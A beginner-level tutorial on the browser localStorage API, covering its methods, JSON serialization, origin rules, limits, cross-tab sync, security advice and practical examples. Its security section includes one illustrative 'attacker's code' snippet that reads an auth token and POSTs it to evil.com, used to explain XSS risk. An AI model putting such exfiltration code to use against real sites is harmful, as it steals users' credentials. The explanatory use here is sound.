# localStorage

## Introduction

localStorage is a way to store data in the browser that stays there even after you close the browser and come back later. Think of it like a small notebook that the browser keeps for your website, where you can write notes and read them anytime.

This guide will teach you everything about localStorage in simple terms.

---

## Part 1: What is localStorage?

### 1.1 Basic Definition

localStorage is a feature built into web browsers that lets you save information on the user's computer.

**Key characteristics:**

- It stores data as key-value pairs (like a dictionary)
- Data stays forever until you delete it
- Each website has its own separate storage
- Only works in browsers, not on servers

**Think of it like:**
A filing cabinet where:

- Each drawer is a website
- Inside each drawer are folders (keys) with papers (values)
- The papers stay there until you throw them away

### 1.2 What localStorage is NOT

localStorage is NOT:

- A database like MySQL or MongoDB
- Sent to the server automatically (unlike cookies)
- Secure storage for passwords or secrets
- Available in Node.js or backend code

---

## Part 2: The Basic API (How to Use It)

### 2.1 Core Methods

There are 5 main things you can do with localStorage:

**1. Save data:**

```javascript
localStorage.setItem("username", "Ankit");
```

**2. Read data:**

```javascript
const username = localStorage.getItem("username");
console.log(username); // "Ankit"
```

**3. Delete one item:**

```javascript
localStorage.removeItem("username");
```

**4. Delete everything:**

```javascript
localStorage.clear();
```

**5. Check how many items are stored:**

```javascript
const count = localStorage.length;
console.log(count); // number of items
```

**6. Get key name by position:**

```javascript
const firstKey = localStorage.key(0);
console.log(firstKey); // name of first key
```

### 2.2 Alternative Syntax (Not Recommended)

You can also use localStorage like a regular object, but this is not the best practice:

```javascript
// Works but not recommended
localStorage.username = "Ankit";
console.log(localStorage.username); // 'Ankit'
delete localStorage.username;
```

**Why not recommended?** Using `setItem` and `getItem` is clearer and more reliable.

---

## Part 3: Everything is a String

### 3.1 The String Rule

This is very important: localStorage only stores strings.

Even if you save a number or boolean, it gets converted to a string:

```javascript
localStorage.setItem("age", 25);
const age = localStorage.getItem("age");
console.log(age); // "25" (string, not number)
console.log(typeof age); // "string"

localStorage.setItem("isLoggedIn", true);
const isLoggedIn = localStorage.getItem("isLoggedIn");
console.log(isLoggedIn); // "true" (string, not boolean)
```

### 3.2 Converting Back to the Right Type

If you need the original type, you must convert it:

```javascript
// Save a number
localStorage.setItem("age", 25);

// Read and convert back to number
const age = Number(localStorage.getItem("age"));
console.log(age); // 25 (number)

// For booleans
localStorage.setItem("isLoggedIn", true);
const isLoggedIn = localStorage.getItem("isLoggedIn") === "true";
console.log(isLoggedIn); // true (boolean)
```

---

## Part 4: Storing Objects and Arrays

### 4.1 The Problem

You cannot directly store objects or arrays:

```javascript
const user = { name: "Ankit", age: 21 };
localStorage.setItem("user", user);

const retrieved = localStorage.getItem("user");
console.log(retrieved); // "[object Object]" - Not useful!
```

### 4.2 The Solution: JSON

Use `JSON.stringify()` to convert objects to strings, and `JSON.parse()` to convert back:

**Saving an object:**

```javascript
const user = {
  name: "Ankit",
  age: 21,
  skills: ["JavaScript", "React", "Node"],
};

// Convert to string and save
localStorage.setItem("user", JSON.stringify(user));
```

**Reading an object:**

```javascript
// Get the string
const userString = localStorage.getItem("user");

// Convert back to object
if (userString !== null) {
  const user = JSON.parse(userString);
  console.log(user.name); // 'Ankit'
  console.log(user.skills); // ['JavaScript', 'React', 'Node']
}
```

### 4.3 Helper Functions (Save Time)

Since you'll do this often, create helper functions:

```javascript
// Save any value as JSON
function saveJSON(key, value) {
  localStorage.setItem(key, JSON.stringify(value));
}

// Load and parse JSON
function loadJSON(key, defaultValue = null) {
  const json = localStorage.getItem(key);

  if (json === null) {
    return defaultValue;
  }

  try {
    return JSON.parse(json);
  } catch (error) {
    console.error("Error parsing JSON:", error);
    return defaultValue;
  }
}

// Usage examples
saveJSON("settings", { theme: "dark", language: "en" });
const settings = loadJSON("settings", { theme: "light" });

saveJSON("todos", ["Learn JS", "Build project"]);
const todos = loadJSON("todos", []);
```

---

## Part 5: Where Can You Use localStorage?

### 5.1 Where It Works

localStorage only works in browser environments where `window` exists:

- Plain HTML + JavaScript pages
- React, Vue, Angular apps (in the browser)
- Chrome extensions
- Electron apps

### 5.2 Where It Does NOT Work

- Node.js (backend/server code)
- Server-side rendering (Next.js `getServerSideProps`, etc.)
- Service workers (use different APIs there)

### 5.3 Safe Usage Pattern

Always check if localStorage exists before using it:

```javascript
// Check if localStorage is available
if (typeof window !== "undefined" && window.localStorage) {
  const theme = localStorage.getItem("theme");
  console.log(theme);
}
```

**In React:**

```javascript
import { useEffect, useState } from "react";

function MyComponent() {
  const [theme, setTheme] = useState("light");

  // Only access localStorage in the browser
  useEffect(() => {
    const savedTheme = localStorage.getItem("theme");
    if (savedTheme) {
      setTheme(savedTheme);
    }
  }, []);

  return <div>Current theme: {theme}</div>;
}
```

---

## Part 6: How Long Does Data Last?

### 6.1 Persistence

Data in localStorage:

- Survives page refresh
- Survives closing the tab
- Survives closing the browser
- Survives computer restart
- Stays there for days, months, or years

### 6.2 When Data Gets Deleted

Data is removed only when:

1. You call `removeItem()` or `clear()` in code
2. User manually clears browser data
3. User uses private/incognito mode (data is cleared when they close the browser)
4. Browser runs out of storage space (very rare)

### 6.3 localStorage vs sessionStorage

**localStorage:** Data stays forever

```javascript
localStorage.setItem("username", "Ankit");
// Still there after closing browser
```

**sessionStorage:** Data is deleted when tab closes

```javascript
sessionStorage.setItem("tempData", "value");
// Gone when you close this tab
```

**When to use each:**

- Use `localStorage` for: user preferences, theme, settings
- Use `sessionStorage` for: temporary form data, wizard steps

---

## Part 7: Same-Origin Rules (Important)

### 7.1 What is an Origin?

An origin is the combination of:

- Protocol (http or https)
- Domain (example.com)
- Port (80, 443, 3000, etc.)

### 7.2 Each Origin Has Its Own localStorage

Different origins have completely separate localStorage:

```javascript
// These are all DIFFERENT storage spaces:

https://myapp.com           // localStorage A
http://myapp.com            // localStorage B (different protocol)
https://myapp.com:3000      // localStorage C (different port)
https://sub.myapp.com       // localStorage D (different subdomain)
https://other.com           // localStorage E (different domain)
```

**What this means:**

- `https://myapp.com` cannot read data from `http://myapp.com`
- Your website cannot read localStorage from other websites
- This is a security feature

### 7.3 Practical Example

```javascript
// On https://myapp.com
localStorage.setItem("token", "abc123");

// On https://api.myapp.com
const token = localStorage.getItem("token");
console.log(token); // null - different origin!
```

---

## Part 8: Storage Limits

### 8.1 How Much Can You Store?

Most browsers allow about 5-10 MB per origin (website).

This is enough for:

- Thousands of small settings
- Hundreds of user preferences
- Dozens of cached API responses

### 8.2 What Happens When You Exceed the Limit?

The browser throws an error:

```javascript
try {
  const bigString = "x".repeat(10000000); // 10 million characters
  localStorage.setItem("bigData", bigString);
} catch (error) {
  console.error("Storage full!", error.name); // "QuotaExceededError"
  // Handle the error - maybe delete old data
}
```

### 8.3 Best Practices

- Don't store huge amounts of data in localStorage
- For large datasets, use IndexedDB instead
- Clean up old/unused data periodically

```javascript
// Example: Clean up old entries
function cleanOldData() {
  const keysToRemove = [];

  for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    if (key.startsWith("old_")) {
      keysToRemove.push(key);
    }
  }

  keysToRemove.forEach((key) => localStorage.removeItem(key));
}
```

---

## Part 9: Performance and Synchronous Nature

### 9.1 localStorage is Synchronous

This means operations block the main thread until they finish.

```javascript
// This blocks everything until done
localStorage.setItem("key", "value");
console.log("This runs after setItem finishes");
```

### 9.2 Performance Considerations

For small data, localStorage is very fast. But:

**Bad practice (can cause lag):**

```javascript
// Writing on every keystroke - can be slow
input.addEventListener("keyup", () => {
  localStorage.setItem("draft", input.value);
});
```

**Better practice (debounce):**

```javascript
let timeout;
input.addEventListener("keyup", () => {
  clearTimeout(timeout);
  timeout = setTimeout(() => {
    localStorage.setItem("draft", input.value);
  }, 500); // Wait 500ms after user stops typing
});
```

### 9.3 Read Once, Store in Memory

Instead of reading localStorage repeatedly:

**Bad:**

```javascript
function displayUsername() {
  return localStorage.getItem("username"); // Reading every time
}

console.log(displayUsername());
console.log(displayUsername());
console.log(displayUsername());
```

**Better:**

```javascript
// Read once at startup
const username = localStorage.getItem("username");

function displayUsername() {
  return username; // Using memory variable
}
```

---

## Part 10: Syncing Across Tabs

### 10.1 The Storage Event

If you have two tabs open for the same website, you can detect when localStorage changes in one tab from the other tab:

```javascript
window.addEventListener("storage", (event) => {
  console.log("Something changed in localStorage!");
  console.log("Key:", event.key);
  console.log("Old value:", event.oldValue);
  console.log("New value:", event.newValue);
});
```

### 10.2 Practical Example: Syncing Theme

**Tab 1:**

```javascript
// User clicks button to change theme
function changeTheme(newTheme) {
  localStorage.setItem("theme", newTheme);
  applyTheme(newTheme);
}

changeTheme("dark");
```

**Tab 2 (automatically updates):**

```javascript
window.addEventListener("storage", (event) => {
  if (event.key === "theme") {
    applyTheme(event.newValue);
  }
});
```

### 10.3 Important Notes

- The `storage` event fires in OTHER tabs, not the tab that made the change
- Very useful for logout (log out in one tab, all tabs respond)
- Works only for tabs on the same origin

---

## Part 11: Security - VERY IMPORTANT

### 11.1 localStorage is NOT Secure

This is critical to understand:

**Any JavaScript code on your page can read localStorage.**

If an attacker injects malicious JavaScript (XSS attack), they can:

```javascript
// Attacker's code
const stolenToken = localStorage.getItem("authToken");
fetch("https://evil.com/steal", {
  method: "POST",
  body: JSON.stringify({ token: stolenToken }),
});
```

### 11.2 What You Should NEVER Store

Do NOT store in localStorage:

- Passwords (never store passwords anywhere in frontend)
- Credit card numbers
- Social security numbers
- API secret keys
- Private encryption keys
- Any highly sensitive data

### 11.3 What You CAN Store

Safe to store:

- User preferences (theme, language)
- UI state (sidebar open/closed)
- Draft content (unsaved form data)
- Non-sensitive cached data
- Feature flags

### 11.4 What About Auth Tokens?

This is debated. Some developers store auth tokens in localStorage, others don't.

**Risks:**

- Vulnerable to XSS attacks

**Alternative:**

- Use HttpOnly cookies (JavaScript cannot access them)

**If you must use localStorage for tokens:**

- Ensure your app is protected against XSS
- Use short-lived tokens
- Implement token refresh mechanism

---

## Part 12: Comparing Storage Options

### 12.1 localStorage vs Cookies

**Cookies:**

- Sent to server with every request automatically
- Can be HttpOnly (JS cannot read them)
- Have expiration dates
- Size limit: about 4 KB
- Good for: authentication, server-side sessions

**localStorage:**

- NOT sent to server
- JavaScript can always read them
- No expiration (stays forever)
- Size limit: 5-10 MB
- Good for: client-side preferences

### 12.2 localStorage vs sessionStorage

**localStorage:**

- Persists forever
- Shared across all tabs of same origin
- Good for: permanent settings

**sessionStorage:**

- Deleted when tab closes
- Separate for each tab
- Good for: temporary data

### 12.3 localStorage vs IndexedDB

**localStorage:**

- Simple key-value store
- Synchronous (blocks main thread)
- Only stores strings
- 5-10 MB limit
- Good for: small amounts of simple data

**IndexedDB:**

- Full database with indexes
- Asynchronous (doesn't block)
- Can store complex objects
- Much larger storage (100+ MB)
- Good for: large amounts of structured data

**When to use what:**

- Small settings/preferences → localStorage
- Large offline data, caching many items → IndexedDB

---

## Part 13: Real-World Examples

### 13.1 Remember Theme Preference

```javascript
// Save theme when user changes it
function setTheme(theme) {
  document.body.className = theme;
  localStorage.setItem("theme", theme);
}

// Load theme on page load
document.addEventListener("DOMContentLoaded", () => {
  const savedTheme = localStorage.getItem("theme") || "light";
  setTheme(savedTheme);
});

// Theme toggle button
document.getElementById("themeToggle").addEventListener("click", () => {
  const currentTheme = localStorage.getItem("theme") || "light";
  const newTheme = currentTheme === "light" ? "dark" : "light";
  setTheme(newTheme);
});
```

### 13.2 Save Form Draft

```javascript
const DRAFT_KEY = "contactFormDraft";
const form = document.getElementById("contactForm");
const textarea = form.querySelector("textarea");

// Load draft when page loads
document.addEventListener("DOMContentLoaded", () => {
  const draft = localStorage.getItem(DRAFT_KEY);
  if (draft) {
    textarea.value = draft;
  }
});

// Save draft as user types (with debounce)
let saveTimeout;
textarea.addEventListener("input", () => {
  clearTimeout(saveTimeout);
  saveTimeout = setTimeout(() => {
    localStorage.setItem(DRAFT_KEY, textarea.value);
  }, 500);
});

// Clear draft when form is submitted
form.addEventListener("submit", (e) => {
  localStorage.removeItem(DRAFT_KEY);
});
```

### 13.3 Remember User Login State

```javascript
// Simple login (not secure, just for demo)
function login(username) {
  localStorage.setItem("currentUser", username);
  localStorage.setItem("loginTime", Date.now());
  updateUI();
}

function logout() {
  localStorage.removeItem("currentUser");
  localStorage.removeItem("loginTime");
  updateUI();
}

function getCurrentUser() {
  return localStorage.getItem("currentUser");
}

function isLoggedIn() {
  return getCurrentUser() !== null;
}

function updateUI() {
  const user = getCurrentUser();
  if (user) {
    document.getElementById("username").textContent = user;
    document.getElementById("loginSection").style.display = "none";
    document.getElementById("userSection").style.display = "block";
  } else {
    document.getElementById("loginSection").style.display = "block";
    document.getElementById("userSection").style.display = "none";
  }
}

// Check login status on page load
document.addEventListener("DOMContentLoaded", updateUI);
```

### 13.4 Save User Preferences

```javascript
const DEFAULT_PREFERENCES = {
  notifications: true,
  soundEnabled: false,
  language: "en",
  fontSize: "medium",
};

function getPreferences() {
  const json = localStorage.getItem("preferences");
  if (!json) return DEFAULT_PREFERENCES;

  try {
    return { ...DEFAULT_PREFERENCES, ...JSON.parse(json) };
  } catch (error) {
    return DEFAULT_PREFERENCES;
  }
}

function savePreferences(preferences) {
  localStorage.setItem("preferences", JSON.stringify(preferences));
}

function updatePreference(key, value) {
  const prefs = getPreferences();
  prefs[key] = value;
  savePreferences(prefs);
}

// Usage
updatePreference("soundEnabled", true);
const prefs = getPreferences();
console.log(prefs.soundEnabled); // true
```

### 13.5 Shopping Cart (Simple Version)

```javascript
function getCart() {
  return loadJSON("cart", []);
}

function addToCart(product) {
  const cart = getCart();
  const existing = cart.find((item) => item.id === product.id);

  if (existing) {
    existing.quantity += 1;
  } else {
    cart.push({ ...product, quantity: 1 });
  }

  saveJSON("cart", cart);
  updateCartDisplay();
}

function removeFromCart(productId) {
  let cart = getCart();
  cart = cart.filter((item) => item.id !== productId);
  saveJSON("cart", cart);
  updateCartDisplay();
}

function clearCart() {
  localStorage.removeItem("cart");
  updateCartDisplay();
}

function getCartTotal() {
  const cart = getCart();
  return cart.reduce((total, item) => {
    return total + item.price * item.quantity;
  }, 0);
}
```

---

## Part 14: Edge Cases and Best Practices

### 14.1 Check if localStorage is Available

Some browsers (private mode, old browsers) might not support localStorage:

```javascript
function isLocalStorageAvailable() {
  try {
    const testKey = "__test__";
    localStorage.setItem(testKey, "test");
    localStorage.removeItem(testKey);
    return true;
  } catch (error) {
    return false;
  }
}

// Usage
if (isLocalStorageAvailable()) {
  // Use localStorage
  localStorage.setItem("theme", "dark");
} else {
  // Fallback: use in-memory storage or cookies
  console.warn("localStorage not available");
}
```

### 14.2 Use Namespaced Keys

Avoid key name collisions by adding a prefix:

**Bad:**

```javascript
localStorage.setItem("theme", "dark");
localStorage.setItem("user", "Ankit");
localStorage.setItem("token", "abc123");
```

**Better:**

```javascript
localStorage.setItem("myApp.theme", "dark");
localStorage.setItem("myApp.user", "Ankit");
localStorage.setItem("myApp.token", "abc123");
```

Or create a wrapper:

```javascript
const storage = {
  prefix: "myApp.",

  set(key, value) {
    localStorage.setItem(this.prefix + key, value);
  },

  get(key) {
    return localStorage.getItem(this.prefix + key);
  },

  remove(key) {
    localStorage.removeItem(this.prefix + key);
  },
};

// Usage
storage.set("theme", "dark");
const theme = storage.get("theme");
```

### 14.3 Handle Missing Data Gracefully

Always assume localStorage might be empty:

```javascript
// Bad - might crash
const user = JSON.parse(localStorage.getItem("user"));
console.log(user.name); // Error if user is null

// Good - safe
const userJson = localStorage.getItem("user");
const user = userJson ? JSON.parse(userJson) : null;
if (user) {
  console.log(user.name);
} else {
  console.log("No user found");
}
```

### 14.4 Validate Data

Data in localStorage can be corrupted or tampered with:

```javascript
function loadUserPreferences() {
  try {
    const json = localStorage.getItem("preferences");
    if (!json) return getDefaultPreferences();

    const prefs = JSON.parse(json);

    // Validate the structure
    if (typeof prefs !== "object" || prefs === null) {
      return getDefaultPreferences();
    }

    // Validate specific fields
    if (typeof prefs.theme !== "string") {
      prefs.theme = "light";
    }

    return prefs;
  } catch (error) {
    console.error("Error loading preferences:", error);
    return getDefaultPreferences();
  }
}
```

### 14.5 Clean Up Old Data

Periodically remove unused data:

```javascript
function cleanupOldData() {
  const oneWeekAgo = Date.now() - 7 * 24 * 60 * 60 * 1000;

  for (let i = localStorage.length - 1; i >= 0; i--) {
    const key = localStorage.key(i);

    if (key.startsWith("temp_")) {
      const item = loadJSON(key);
      if (item && item.timestamp < oneWeekAgo) {
        localStorage.removeItem(key);
      }
    }
  }
}

// Run on app startup
cleanupOldData();
```

---

## Part 15: Complete Cheatsheet

### Quick Reference

**Save data:**

```javascript
localStorage.setItem("key", "value");
```

**Read data:**

```javascript
const value = localStorage.getItem("key"); // null if not found
```

**Remove data:**

```javascript
localStorage.removeItem("key");
```

**Clear all:**

```javascript
localStorage.clear();
```

**Store objects:**

```javascript
localStorage.setItem("user", JSON.stringify(obj));
const obj = JSON.parse(localStorage.getItem("user"));
```

**Check if exists:**

```javascript
if (localStorage.getItem("key") !== null) {
  // exists
}
```

**Loop through all items:**

```javascript
for (let i = 0; i < localStorage.length; i++) {
  const key = localStorage.key(i);
  const value = localStorage.getItem(key);
  console.log(key, value);
}
```

---

## Part 16: When to Use localStorage

### Use localStorage for:

- User preferences (theme, language, layout)
- UI state (sidebar collapsed/expanded)
- Form drafts (auto-save feature)
- Recently viewed items
- Non-sensitive cached data
- Feature flags
- Tutorial completion status

### Do NOT use localStorage for:

- Passwords or secrets
- Large datasets (use IndexedDB)
- Sensitive user data
- Data that must be secure
- Server-side code (it doesn't exist there)
- Data that needs to be sent to server (use cookies or API calls)

---
